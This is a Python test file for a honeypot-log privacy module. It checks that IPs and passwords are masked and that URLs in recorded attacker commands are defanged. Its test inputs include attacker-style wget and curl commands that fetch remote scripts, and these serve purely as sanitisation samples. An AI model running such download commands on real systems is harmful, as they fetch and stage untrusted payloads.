from app.normalize import normalize_document
from app.privacy import mask_ip, mask_password, project_event, sanitize_command
from tests.conftest import cowrie_doc


def test_mask_ipv4_and_ipv6():
    assert mask_ip("203.0.113.77") == "203.0.*.*"
    assert mask_ip("2001:db8::1") == "2001:0db8:*:*:*:*:*:*"
    assert mask_ip("not-an-ip") == "masked"
    assert mask_ip(None) is None


def test_mask_password_hides_length():
    assert mask_password("a") == mask_password("a" * 40) == "a••••••"
    assert mask_password("hunter2") == "h••••••"
    assert mask_password(None) is None


def test_sanitize_command_masks_ips_and_defangs_urls():
    out = sanitize_command("wget http://198.51.100.77/x.sh; curl HTTPS://203.0.113.5/y")
    assert "198.51.100.77" not in out and "203.0.113.5" not in out
    assert "http://" not in out.lower() and "hxxp[:]//" in out and "hxxps[:]//" in out


def test_public_projection_masks_everything_sensitive():
    event = normalize_document(cowrie_doc(input="wget http://198.51.100.77/a"))
    data = project_event(event, public_mode=True)
    assert data["source_ip"] == "203.0.*.*"
    assert data["password"] == "h••••••"
    assert data["destination_ip"] is None
    assert data["raw"] is None
    assert "198.51.100.77" not in str(data)
    assert "hunter2" not in str(data)


def test_private_projection_keeps_full_data():
    event = normalize_document(cowrie_doc())
    data = project_event(event, public_mode=False)
    assert data["source_ip"] == "203.0.113.7"
    assert data["password"] == "hunter2"
    assert data["raw"]["src_ip"] == "203.0.113.7"
